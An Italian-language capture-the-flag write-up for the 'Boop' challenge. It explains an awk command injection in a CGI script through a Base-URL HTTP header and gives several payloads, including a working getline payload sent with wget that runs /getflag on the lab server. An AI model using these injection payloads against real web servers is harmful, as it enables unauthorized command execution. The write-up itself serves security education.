# Boop CTF Challenge Write-up

## Introduzione

Questa challenge prevedeva lo sfruttamento di una vulnerabilità di command injection in uno script CGI per ottenere una flag presente sul server remoto. L'applicazione web, chiamata "Boop", esponeva un endpoint `/api/protocol` che si è rivelato vulnerabile.

## Ricognizione Iniziale

1.  **Analisi del `docker-compose.yml`**:
    La prima analisi ha rivelato la struttura dell'applicazione, con un servizio `boop` che utilizzava un'immagine custom e un servizio `backend`. È stata notata la variabile d'ambiente `HTTP_BASE_URL=https://10.42.0.2:38079` per il servizio `boop`.

2.  **Esplorazione del `Dockerfile`**:
    Il `Dockerfile` (`boop/src/Dockerfile`) mostrava che un file chiamato `getflag` veniva copiato in `/getflag` all'interno del container e gli venivano assegnati permessi di esecuzione (`chmod 111 /getflag`). Questo ha indicato che l'obiettivo era eseguire `/getflag` sul server.

    ```dockerfile
    COPY ./getflag /getflag
    RUN chmod 111 /getflag
    ```

3.  **Analisi degli script CGI**:
    La directory `boop/src/cgi-bin/` conteneva lo script `protocol`. L'analisi di questo script è stata cruciale.

    ```sh
    #!/bin/sh
    echo -e "Content-type: text/html\\n";

    PROTOCOL=$(awk "BEGIN {split(\\"$HTTP_BASE_URL\\", a, \\":\\"); print a[1]}");
    echo $PROTOCOL;
    ```
    Lo script prende la variabile d'ambiente `$HTTP_BASE_URL`, la passa ad `awk` per estrarre il protocollo (es. "http" o "https"), e poi stampa il risultato. La vulnerabilità risiede nel fatto che `$HTTP_BASE_URL` viene inserita direttamente in una stringa che `awk` esegue, permettendo l'iniezione di comandi `awk`.

## Identificazione della Vulnerabilità

L'endpoint `/api/protocol` eseguiva lo script `cgi-bin/protocol`. È stato possibile sovrascrivere la variabile `$HTTP_BASE_URL` inviando un header HTTP `Base-URL`. La vulnerabilità era una command injection all'interno del comando `awk`.

Il comando `awk` eseguito dallo script è:
```bash
awk "BEGIN {split(\\"$HTTP_BASE_URL\\", a, \\":\\"); print a[1]}"
```
Il valore fornito tramite l'header `Base-URL` viene interpolato direttamente in questa stringa, permettendo di manipolare il comando `awk`.

## Sfruttamento della Vulnerabilità

Sono stati necessari diversi tentativi per trovare il payload corretto. L'obiettivo era eseguire `/getflag` e far sì che il suo output venisse stampato nella risposta HTTP.

1.  **Tentativi Iniziali Falliti**:
    *   Uso di `system()` in `awk`: `Base-URL: test"; system("/getflag"); print "done'`. Questo eseguiva il comando ma non ne catturava l'output.
    *   Uso di backtick `` ` `` in `awk`: `Base-URL: test"; print `/getflag`; print "done'`. Non ha funzionato come previsto.
    *   Tentativi di chiudere il comando `awk` e iniziarne uno nuovo a livello di shell: questi non hanno funzionato a causa di come `awk` interpretava la stringa e gli escape.

2.  **Creazione di uno script di test locale (`test_script.sh`)**:
    Per debuggare l'injection `awk` più efficacemente, è stato creato uno script locale che mimava il comportamento dello script CGI:
    ```sh
    #!/bin/sh
    echo -e "Content-type: text/html\\n";

    HTTP_BASE_URL="$1"
    PROTOCOL=$(awk "BEGIN {split(\\"$HTTP_BASE_URL\\", a, \\":\\"); print a[1]}");
    echo $PROTOCOL;
    ```
    Questo ha permesso di testare i payload rapidamente.

3.  **La Svolta: `getline` e la corretta formattazione del payload**:
    Dopo vari test, si è capito che `getline` di `awk` poteva essere usato per catturare l'output di un comando eseguito tramite una pipe. Il problema principale era la corretta formattazione e l'escaping per far sì che il payload si integrasse correttamente nel comando `awk` esistente.

    Il test locale che ha funzionato è stato:
    ```bash
    ./test_script.sh 'test",a,":"); "echo hello" | getline result; print result; print a[1]; split("dummy'
    ```
    Output:
    ```
    Content-type: text/html

    hello test dummy
    ```
    Questo ha confermato che la struttura del payload era corretta:
    *   `test",a,":")` : Completa la sintassi della funzione `split` originale, fornendo `test` come valore per `$HTTP_BASE_URL`, `a` come nome dell'array, e `:` come delimitatore.
    *   `; "echo hello" | getline result; print result;` : Esegue `echo hello`, ne cattura l'output in `result` e lo stampa.
    *   `print a[1];` : Esegue la parte originale del comando `awk` (`print a[1]`), che stamperà "test".
    *   `split("dummy` : Inizia una nuova chiamata a `split` per assicurare che la sintassi `awk` rimanga valida (il `BEGIN {` originale viene chiuso implicitamente dal primo `;` che termina il blocco `BEGIN`).

4.  **Payload Finale**:
    Sostituendo `"echo hello"` con `"/getflag"`, il payload finale per l'header `Base-URL` è diventato:
    ```
    test",a,":"); "/getflag" | getline result; print result; print a[1]; split("dummy
    ```

5.  **Esecuzione dell'Exploit**:
    Il comando `wget` (o `curl`) è stato usato per inviare la richiesta con l'header manipolato:
    ```bash
    wget --header='Base-URL: test",a,":"); "/getflag" | getline result; print result; print a[1]; split("dummy' -O final_attempt.txt 'http://10.42.0.2:38079/api/protocol'
    ```

6.  **Ottenimento della Flag**:
    Il file `final_attempt.txt` conteneva l'output:
    ```
    CCIT{th4nk_y0u_4_w4171nG_BOOP!_:3__44038da7} test dummy
    ```

## La Flag

La flag ottenuta è: **`CCIT{th4nk_y0u_4_w4171nG_BOOP!_:3__44038da7}`**

## Conclusioni e Lezioni Apprese

*   **Sanitizzazione degli Input**: Questa challenge sottolinea l'importanza critica della sanitizzazione di qualsiasi input utente, specialmente quando viene utilizzato per costruire comandi da eseguire.
*   **Comprendere il Contesto di Esecuzione**: Capire come e dove l'input viene processato (in questo caso, all'interno di una stringa `awk`) è fondamentale per costruire un payload efficace.
*   **Testing Locale**: Creare un ambiente di test locale semplificato può accelerare significativamente il processo di debugging per vulnerabilità complesse come le command injection.
*   **Varietà di Tecniche di Injection**: Esistono molti modi per iniettare comandi, e spesso è necessario provare diverse tecniche (e.g., `system()`, backtick, pipe con `getline`) prima di trovare quella che funziona nel contesto specifico. 